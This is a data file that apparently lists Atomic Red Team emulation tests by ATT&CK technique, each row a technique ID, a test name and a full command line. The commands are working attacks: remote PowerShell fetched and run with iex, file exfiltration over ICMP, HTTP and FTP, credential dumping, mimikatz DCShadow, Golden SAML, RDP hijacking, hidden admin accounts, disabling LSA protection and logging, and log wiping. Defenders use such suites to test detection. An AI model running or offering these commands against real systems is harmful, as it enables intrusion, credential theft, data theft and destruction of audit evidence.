[system.runtime.interopservices.marshal]::releasecomobject($xlbook) | out-null [system.runtime.interopservices.marshal]::releasecomobject($xlapp) | out-null [system.gc]::collect() [system.gc]::waitforpendingfinalizers() remove-variable xlbook remove-variable xlapp"
T1204,Headless Chrome code execution via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1204.002\src\chromeexec-macrocode.txt"" -officeproduct ""word"" -sub ""execchrome"""
T1204,Potentially Unwanted Applications (PUA),"invoke-webrequest #{pua_url} -outfile #{pua_file} & ""#{pua_file}"""
T1204,Office Generic Payload Download,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = get-content ""#{macro_path}"" -raw $url = ""#{c2_domain}"" + ""/"" + ""#{c2_parent_directory}"" $macrocode = $macrocode -replace 'serverpath', $url -replace 'filename', ""#{file_name}"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1204,LNK Payload Download,"invoke-webrequest -outfile $env:temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/bin/test10.lnk"" $file1 = ""$env:temp\test10.lnk"" start-process $file1 start-sleep -s 10 taskkill /im a.exe /f"
T1204,Mirror Blast Emulation,"cd ""c:\programdata\microsoft\windows\start menu\programs"" new-itemproperty -path registry::hkey_current_user\software\microsoft\office\16.0\excel\security -name ""vbawarnings"" -value ""1"" -propertytype dword -force | out-null & '.\excel 2016.lnk' ""pathtoatomicsfolder\t1204.002\bin\mirrorblast_emulation.xlsm"""
T1204,ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell,"set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\runmru"" -name ""atomictest"" -value '""c:\windows\system32\mshta.exe"" http://localhost/hello6.hta'"
T1204,Simulate Click-Fix via Downloaded BAT File,"$url = ""#{url}"" $outfile = ""#{outfile}"" invoke-webrequest -uri $url -outfile $outfile -usebasicparsing $process = start-process -filepath $outfile -passthru -windowstyle normal $process.id | out-file ""$env:temp\click-fix-pid.txt"""
T1053,Cron - Replace crontab with referenced file,"crontab -l > /tmp/notevil echo ""* * * * * #{command}"" > #{tmp_cron} && crontab #{tmp_cron}"
T1053,Cron - Add script to all cron subfolders,"echo ""#{command}"" > /etc/cron.daily/#{cron_script_name} echo ""#{command}"" > /etc/cron.hourly/#{cron_script_name} echo ""#{command}"" > /etc/cron.monthly/#{cron_script_name} echo ""#{command}"" > /etc/cron.weekly/#{cron_script_name}"
T1053,Cron - Add script to /etc/cron.d folder,"echo ""#{command}"" > /etc/cron.d/#{cron_script_name}"
T1053,Cron - Add script to /var/spool/cron/crontabs/ folder,"echo ""#{command}"" >> /var/spool/cron/crontabs/#{cron_script_name}"
T1555,Access Saved Credentials via VaultCmd,"vaultcmd /listcreds:""windows credentials"""
T1555,WinPwn - Loot local Credentials - Invoke-WCMDump,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/creds/master/obfuscatedps/dumpwcm.ps1') invoke-wcmdump
T1176,Google Chrome Load Unpacked Extension With Command Line,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1546,Append malicious start-process cmdlet,"add-content #{ps_profile} -value """" add-content #{ps_profile} -value ""start-process #{exe_path}"" powershell -command exit"
T1201,Examine password complexity policy - Ubuntu,cat /etc/pam.d/common-password
T1201,Examine password complexity policy - FreeBSD,cat /etc/pam.d/passwd
T1201,Examine password complexity policy - CentOS/RHEL 7.x,cat /etc/security/pwquality.conf
T1201,Examine password complexity policy - CentOS/RHEL 6.x,cat /etc/pam.d/system-auth cat /etc/security/pwquality.conf
T1201,Examine password expiration policy - All Linux,cat /etc/login.defs
T1201,Examine local password policy - Windows,net accounts
T1201,Examine domain password policy - Windows,net accounts /domain
T1201,Examine password policy - macOS,pwpolicy getaccountpolicies
T1201,Get-DomainPolicy with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domainpolicy -verbose
T1201,Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,get-addefaultdomainpasswordpolicy
T1201,Use of SecEdit.exe to export the local security policy (including the password policy),secedit.exe /export /areas securitypolicy /cfg output_mysecpol.txt
T1201,Examine AWS Password Policy,aws iam get-account-password-policy
T1048,Exfiltration Over Alternative Protocol - ICMP,"$ping = new-object system.net.networkinformation.ping; foreach($data in get-content -path #{input_file} -encoding byte -readcount 1024) { $ping.send(""#{ip_address}"", 1500, $data) }"
T1048,Exfiltration Over Alternative Protocol - HTTP,$content = get-content #{input_file} invoke-webrequest -uri #{ip_address} -method post -body $content
T1048,Exfiltration Over Alternative Protocol - SMTP,"send-mailmessage -from #{sender} -to #{receiver} -subject ""t1048.003 atomic test"" -attachments #{input_file} -smtpserver #{smtp_server}"
T1048,MAZE FTP Upload,"$dir_to_copy = ""$env:windir\temp"" $ftp = ""ftp://#{ftp_server}/"" $web_client = new-object system.net.webclient $web_client.credentials = new-object system.net.networkcredential('#{username}', '#{password}') if (test-connection -count 1 -computername ""#{ftp_server}"" -quiet) {foreach($file in (dir $dir_to_copy ""*.7z"")) {echo ""uploading $file..."" $uri = new-object system.uri($ftp+$file.name) $web_client.uploadfile($uri, $file.fullname)}} else {echo ""ftp server unreachable. please verify the server address in input args and try again.""}"
T1048,Exfiltration Over Alternative Protocol - FTP - Rclone,"$rclone_bin = get-childitem c:\users\public\downloads\ -recurse -include ""rclone.exe"" | select-object -expandproperty fullname $exfil_pack = get-childitem c:\users\public\downloads\ -recurse -include ""exfil.zip"" | select-object -expandproperty fullname &$rclone_bin config create ftpserver ""ftp"" ""host"" #{ftp_server} ""port"" #{ftp_port} ""user"" #{ftp_user} ""pass"" #{ftp_pass} &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2m -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -p --ftp-no-check-certificate"
T1048,Python3 http.server,"[ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & pid=$!; sleep 10; kill $pid; unset pid; fi"
T1552,AWS - Retrieve EC2 Password Data using stratus,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.credential-access.ec2-get-password-data echo ""starting detonate"" ./stratus detonate aws.credential-access.ec2-get-password-data --force"
T1552,Search for Passwords in Powershell History,"ls -r c:\users\*\appdata\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt | select-string ""password"", ""-p"", ""key"", ""pwd"", ""pass"""
T1615,Display group policy information via gpresult,gpresult /z
T1615,Get-DomainGPO to display group policy information via PowerView,"powershell -nop -exec bypass -c ""iex (new-object net.webclient).downloadstring('https://github.com/bc-security/empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); get-domaingpo"""
T1615,WinPwn - GPOAudit,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gpoaudit -noninteractive -consoleoutput
T1615,WinPwn - GPORemoteAccessPolicy,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gporemoteaccesspolicy -consoleoutput -noninteractive
T1615,MSFT Get-GPO Cmdlet,get-gpo -domain $env:userdnsdomain #{gpo_param} >> #{gpo_output}
T1574,Service Registry Permissions Weakness,get-acl registry::hklm\system\currentcontrolset\services\* |fl get-acl registry::hklm\system\currentcontrolset\services\#{weak_service_name} |fl
T1574,Service ImagePath Change with reg.exe,"reg.exe add ""hklm\system\currentcontrolset\services\#{weak_service_name}"" /f /v imagepath /d ""#{malicious_service_path}"""
T1040,Packet Capture Linux using tshark or tcpdump,tcpdump -c 5 -nnni #{interface} tshark -c 5 -i #{interface}
T1040,Packet Capture FreeBSD using tshark or tcpdump,tcpdump -c 5 -nnni #{interface} tshark -c 5 -i #{interface}
T1040,Packet Capture macOS using tcpdump or tshark,"sudo tcpdump -c 5 -nnni #{interface} if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i #{interface}; fi;"
T1040,Packet Capture Windows Command Prompt,"""c:\program files\wireshark\tshark.exe"" -i #{interface} -c 5"
T1040,Windows Internal Packet Capture,netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
T1040,Windows Internal pktmon capture,pktmon.exe start --etw -f %temp%\t1040.etl timeout /t 5 >nul 2>&1 pktmon.exe stop
T1040,Windows Internal pktmon set filter,pktmon.exe filter add -p 445
T1040,Packet Capture macOS using /dev/bpfN with sudo,sudo #{program_path} -i #{ifname} -t 3
T1040,Filtered Packet Capture macOS using /dev/bpfN with sudo,sudo #{program_path} -f -i #{ifname} -t 3
T1040,Packet Capture FreeBSD using /dev/bpfN with sudo,sudo #{program_path} -i #{ifname} -t 3
T1040,Filtered Packet Capture FreeBSD using /dev/bpfN with sudo,sudo #{program_path} -f -i #{ifname} -t 3
T1040,"Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo",sudo #{program_path} -a -t 3
T1040,"Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo",sudo #{program_path} -4 -p 6 -t 3
T1040,"Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo",sudo #{program_path} -4 -p -p 17 -t 3
T1040,"Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo",sudo #{program_path} -a -f -t 3
T1040,PowerShell Network Sniffing,"new-neteventsession -name capture007 -localfilepath ""$env:temp\sniff.etl"" add-neteventpacketcaptureprovider -sessionname capture007 -truncationlength 100 start-neteventsession -name capture007 stop-neteventsession -name capture007 remove-neteventsession -name capture007"
T1563,RDP hijacking,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack"
T1027,Pad Binary to Change Hash - Linux/macOS dd,dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
T1027,Pad Binary to Change Hash using truncate command - Linux/macOS,truncate -s +1 #{file_to_pad} #adds a byte to the file size
T1564,Extract binary files via VBA,"$macro = [system.io.file]::readalltext(""pathtoatomicsfolder\t1564\src\t1564-macrocode.txt"") $macro = $macro -replace ""areplacemea"", ""pathtoatomicsfolder\t1564\bin\extractme.bin"" [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrocode ""$macro"" -officeproduct ""word"" -sub ""extract"" -nowrap"
T1564,"Create a Hidden User Called ""$""",net user $ atomic123! /add /active:yes
T1564,"Create an ""Administrator "" user (with a space on the end)","new-localuser -name ""administrator "" -nopassword"
T1564,Create and Hide a Service with sc.exe,"sc.exe create #{service_name} binpath= ""#{executable_command}"" sc sdset #{service_name} ""d:(d;;dclcwpdtsd;;;iu)(d;;dclcwpdtsd;;;su)(d;;dclcwpdtsd;;;ba)(a;;cclcswlocrrc;;;iu)(a;;cclcswlocrrc;;;su)(a;;cclcswrpwpdtlocrrc;;;sy)(a;;ccdclcswrpwpdtlocrsdrcwdwo;;;ba)s:(au;fa;ccdclcswrpwpdtlocrsdrcwdwo;;;wd)"""
T1564,Command Execution with NirCmd,"cmd /c ""#{nircmd_location}"" #{command_to_execute}"
T1140,Deobfuscate/Decode Files Or Information,certutil -encode #{executable} %temp%\t1140_calc.txt certutil -decode %temp%\t1140_calc.txt %temp%\t1140_calc_decoded.exe
T1140,Certutil Rename and Decode,copy %windir%\system32\certutil.exe %temp%\tcm.tmp %temp%\tcm.tmp -encode #{executable} %temp%\t1140_calc2.txt %temp%\tcm.tmp -decode %temp%\t1140_calc2.txt %temp%\t1140_calc2_decoded.exe
T1140,Base64 decoding with Python,"encoded=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())') python3 -c ""import base64;dec=base64.b64decode(\""$encoded\"");print(dec.decode())"" python3 -c ""import base64 as d;dec=d.b64decode(\""$encoded\"");print(dec.decode())"" python3 -c ""from base64 import b64decode;dec=b64decode(\""$encoded\"");print(dec.decode())"" python3 -c ""from base64 import b64decode as d;dec=d(\""$encoded\"");print(dec.decode())"" echo $encoded | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"" echo $encoded > #{encoded_file} && python3 -c ""import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())"""
T1140,Base64 decoding with Perl,"encoded=$(perl -e ""use mime::base64;print(encode_base64('#{message}'));"") perl -le ""use mime::base64;print(decode_base64('$encoded'));"" echo $encoded | perl -le 'use mime::base64;print(decode_base64(<stdin>));' echo $encoded > #{encoded_file} && perl -le 'use mime::base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'"
T1140,Base64 decoding with shell utilities,"encoded=$(echo '#{message}' | base64) printf $encoded | base64 -d echo $encoded | base64 -d echo $(echo $encoded) | base64 -d echo $encoded > #{encoded_file} && base64 -d #{encoded_file} echo $encoded > #{encoded_file} && base64 -d < #{encoded_file} echo $encoded > #{encoded_file} && cat #{encoded_file} | base64 -d echo $encoded > #{encoded_file} && cat < #{encoded_file} | base64 -d bash -c ""{echo,\""$(echo $encoded)\""}|{base64,-d}"""
T1140,Base64 decoding with shell utilities (freebsd),encoded=$(echo '#{message}' | b64encode -r -) printf $encoded | b64decode -r echo $encoded | b64decode -r echo $(echo $encoded) | b64decode -r echo $encoded > #{encoded_file} && b64encode -r #{encoded_file} echo $encoded > #{encoded_file} && b64decode -r < #{encoded_file} echo $encoded > #{encoded_file} && cat #{encoded_file} | b64decode -r echo $encoded > #{encoded_file} && cat < #{encoded_file} | b64decode -r
T1140,FreeBSD b64encode Shebang in CLI,echo #{bash_encoded} | b64decode -r | sh echo #{dash_encoded} | b64decode -r | sh echo #{fish_encoded} | b64decode -r | sh echo #{sh_encoded} | b64decode -r | sh
T1140,Hex decoding with shell utilities,encoded=$(echo '#{message}' | xxd -ps -c 256) printf $encoded | xxd -r -p echo $encoded | xxd -r -p echo $(echo $encoded) | xxd -r -p echo $encoded > #{encoded_file} && xxd -r -p #{encoded_file} echo $encoded > #{encoded_file} && xxd -r -p < #{encoded_file} echo $encoded > #{encoded_file} && cat #{encoded_file} | xxd -r -p echo $encoded > #{encoded_file} && cat < #{encoded_file} | xxd -r -p
T1140,Linux Base64 Encoded Shebang in CLI,echo #{bash_encoded} | base64 -d | bash echo #{dash_encoded} | base64 -d | bash echo #{fish_encoded} | base64 -d | bash echo #{sh_encoded} | base64 -d | bash
T1140,XOR decoding and command execution using Python,"python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: """".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = ""#{encrypted_command}""; key = ""#{xor_key}""; exec = xor_decrypt(command, key); subprocess.call(exec, shell=true)'"
T1140,Expand CAB with expand.exe,"mkdir ""#{output_dir}"" >nul 2>&1 echo hello from atomic red team > ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" makecab ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" ""#{cab_path}"" pushd ""#{output_dir}"" expand ""#{cab_path}"" -f:* . popd"
T1053,ListCronjobs,kubectl get cronjobs -n #{namespace}
T1053,CreateCronjob,kubectl create -f src/cronjob.yaml -n #{namespace}
T1562,Windows Disable LSA Protection,reg add hklm\system\currentcontrolset\control\lsa /v runasppl /t reg_dword /d 0 /f
T1562,Disable journal logging via systemctl utility,sudo systemctl stop systemd-journald #disables journal logging
T1562,Disable journal logging via sed utility,sudo sed -i 's/storage=auto/storage=none/' /etc/systemd/journald.conf
T1005,Search files of interest and save them to a single zip file (Windows),"$startingdirectory = ""#{starting_directory}"" $outputzip = ""#{output_zip_folder_path}"" $fileextensionsstring = ""#{file_extensions}"" $fileextensions = $fileextensionsstring -split "", "" new-item -type directory $outputzip -erroraction ignore -force | out-null function search-files { param ( [string]$directory ) $files = get-childitem -path $directory -file -recurse | where-object { $fileextensions -contains $_.extension.tolower() } return $files } $foundfiles = search-files -directory $startingdirectory if ($foundfiles.count -gt 0) { $foundfilepaths = $foundfiles.fullname compress-archive -path $foundfilepaths -destinationpath ""$outputzip\data.zip"" write-host ""zip file created: $outputzip\data.zip"" } else { write-host ""no files found with the specified extensions."" }"
T1005,Find and dump sqlite databases (Linux),"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;"
T1005,Copy Apple Notes database files using AppleScript,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""#{destination_path}""' -e 'set notesfolderpath to (path to home folder as text) & ""library:group containers:group.com.apple.notes:""' -e 'set notesfolder to folder notesfolderpath' -e 'set notesfiles to {file ""notestore.sqlite"", file ""notestore.sqlite-shm"", file ""notestore.sqlite-wal""} of notesfolder' -e 'repeat with afile in notesfiles' -e 'duplicate afile to folder destinationfolderpath with replacing' -e 'end' -e 'end tell'"
T1569,Launchctl,launchctl submit -l #{label_name} -- #{executable_path}
T1528,Azure - Functions code upload - Functions code injection via Blob upload,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionstring --output tsv # download blob for cleanup $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + ""#{blob_name}"") az storage blob download --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmporiginalfunctioncode --overwrite true if ($lastexitcode -eq 0) { # upload new blob version if download of existing blob succeeded az storage blob upload --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true } else { write-output ""download original function code failed."" exit 1 } }"
T1528,Azure - Functions code upload - Functions code injection via File Share modification to retrieve the Functions identity access token,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { # download file for cleanup $tmporiginalfilename = [system.io.path]::getfilename(""#{file_path}"") $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmporiginalfunctioncode if ($lastexitcode -eq 0) { # upload new funciton code if download of existing code succeeded if (""#{execution_option}"" -eq ""insert_code"") { # download file from file share for injection $tmpfunctioncode = join-path $env:temp/ (""t1528_tmp_to_inject_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpfunctioncode if ($lastexitcode -ne 0) { write-output ""function code download failed."" exit 1 } write-output ""file downloaded: $($tmpfunctioncode)"" $insertcontent = get-content -path ""#{code_to_insert_path}"" -raw # load the content of the insert file $content = get-content -path $tmpfunctioncode -raw # inject code to file $content = $insertcontent + ""`n"" + $content # insert the new code at the beginning $content | set-content -path $tmpfunctioncode # write the modified content to the file # upload file to file share az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpfunctioncode --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } elseif (""#{execution_option}"" -eq ""replace_file"") { az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } else { write-output ""please choose a valid execution_option"" exit 1 } } else { write-output ""download original function code failed."" exit 1 } }"
T1021,Enable Windows Remote Management,enable-psremoting -force
T1021,Remote Code Execution with PS Credentials Using Invoke-Command,enable-psremoting -force invoke-command -computername $env:computername -scriptblock {whoami}
T1021,WinRM Access with Evil-WinRM,evil-winrm -i #{destination_address} -u #{user_name} -p #{password}
T1207,DCShadow (Active Directory),"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1070,rm -rf,sudo rm -rf #{syslog_path} if [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi
T1070,rm -rf,rm -rf /var/log/messages rm -rf /var/log/security
T1070,Delete log files using built-in log utility,sudo log erase --all sudo log erase --ttl #deletes only time-to-live log content
T1070,Truncate system log files via truncate utility,sudo truncate -s 0 #{system_log_path} #size parameter shorthand
T1070,Truncate system log files via truncate utility (freebsd),truncate -s 0 /var/log/messages #size parameter shorthand truncate --size=0 /var/log/security #size parameter
T1070,Delete log files via cat utility by appending /dev/null or /dev/zero,sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes sudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)
T1070,Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd),cat /dev/null > /var/log/messages #truncating the file to zero bytes cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)
T1070,System log file deletion via find utility,"sudo find /var/log -name '#{system_log_name1}*' -exec rm {} \; #using ""rm"" execution sudo find /var/log -name ""#{system_log_name2}*"" -exec shred -u -z -n 3 {} \; #using ""shred"" execution sudo find /var/log -name ""#{system_log_name3}*"" -exec unlink {} \; #using ""unlink"" execution"
T1070,Overwrite macOS system log via echo utility,sudo echo '' > #{system_log_path}
T1070,Overwrite FreeBSD system log via echo utility,echo '' > /var/log/messages
T1070,Real-time system log clearance/deletion,sudo log -f /var/log/system.log | : > /var/log/system.log
T1070,Delete system log files via unlink utility,sudo unlink #{system_log_path}
T1070,Delete system log files via unlink utility (freebsd),unlink /var/log/messages
T1070,Delete system log files using shred utility,sudo shred -u -z -n 3 #{system_log_path}
T1070,Delete system log files using srm utility,sudo srm #{system_log_path} #system log file deletion sudo srm -r #{system_log_folder} #recursive deletion of log files
T1070,Delete system log files using OSAScript,"osascript -e 'do shell script ""rm #{system_log_path}"" with administrator privileges'"
T1070,Delete system log files using Applescript,"osascript -e 'tell application ""finder"" to delete posix file ""#{system_log_path}""'"
T1070,Delete system journal logs via rm and journalctl utilities,"sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place"
T1070,Overwrite Linux Mail Spool,echo 0> /var/spool/mail/#{username}
T1070,Overwrite Linux Log,echo 0> #{log_path}
T1115,Utilize Clipboard to store or execute commands from,"dir | clip echo ""t1115"" > %temp%\t1115.txt clip < %temp%\t1115.txt"
T1115,Execute Commands from Clipboard using PowerShell,echo get-process | clip get-clipboard | iex
T1115,Execute commands from clipboard,echo ifconfig | pbcopy $(pbpaste)
T1115,Collect Clipboard Data via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard"""
T1115,Add or copy content to clipboard with xClip,apt install xclip -y history | tail -n 30 | xclip -sel clip xclip -o > history.txt
T1125,Registry artefact when application use webcam,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1059,AutoHotKey script execution,"start-process -filepath ""#{autohotkey_path}"" -argumentlist ""#{script_path}"""
T1021,ESXi - Enable SSH via PowerCLI,"set-powercliconfiguration -invalidcertificateaction ignore -participateinceip:$false -confirm:$false connect-viserver -server #{vm_host} -user #{vm_user} -password #{vm_pass} get-vmhostservice -vmhost #{vm_host} | where-object {$_.key -eq ""tsm-ssh"" } | start-vmhostservice -confirm:$false"
T1021,ESXi - Enable SSH via VIM-CMD,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""vim-cmd hostsvc/enable_ssh"""
T1552,GPP Passwords (findstr),findstr /s cpassword %logonserver%\sysvol\*.xml
T1552,GPP Passwords (Get-GPPPassword),". ""#{gpp_script_path}"" get-gpppassword -verbose"
T1134,Access Token Manipulation,"set-executionpolicy -scope process bypass -force $owners = @{} gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user} get-process | select processname,id,@{l=""owner"";e={$owners[$_.id.tostring()]}} & ""$pathtoatomicsfolder\t1134.002\src\gettoken.ps1""; [myprocess]::createprocessfromparent((get-process lsass).id,""cmd.exe"")"
T1134,WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/tokenmanipulation/get-winlogontokensystem.ps1');get-winlogontokensystem
T1221,WINWORD Remote Template Injection,"start ""#{docx_file}"""
T1606,Golden SAML,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1560,Compressing data using GZip in Python (FreeBSD/Linux),"which_python=`which python || which python3` $which_python -c ""import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.gzipfile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();"""
T1560,Compressing data using bz2 in Python (FreeBSD/Linux),"which_python=`which python || which python3` $which_python -c ""import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();"""
T1560,Compressing data using zipfile in Python (FreeBSD/Linux),"which_python=`which python || which python3` $which_python -c ""from zipfile import zipfile; zipfile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')"""
T1560,Compressing data using tarfile in Python (FreeBSD/Linux),"which_python=`which python || which python3` $which_python -c ""import tarfile; output_file = tarfile.open('#{path_to_output_file}','w'); output_file.add('#{path_to_input_file}'); output_file.close()"""
T1547,Linux - Load Kernel Module via insmod,sudo insmod #{module_path}
T1547,MacOS - Load Kernel Module via kextload and kmutil,set -x sudo kextload #{module_path} kextstat 2>/dev/null | grep softraid sudo kextunload #{module_path} sudo kmutil load -p #{module_path} kextstat 2>/dev/null | grep softraid sudo kmutil unload -p #{module_path}
T1547,MacOS - Load Kernel Module via KextManagerLoadKextWithURL(),sudo #{exe_path} kextstat 2>/dev/null | grep softraid sudo kextunload /library/extensions/softraid.kext
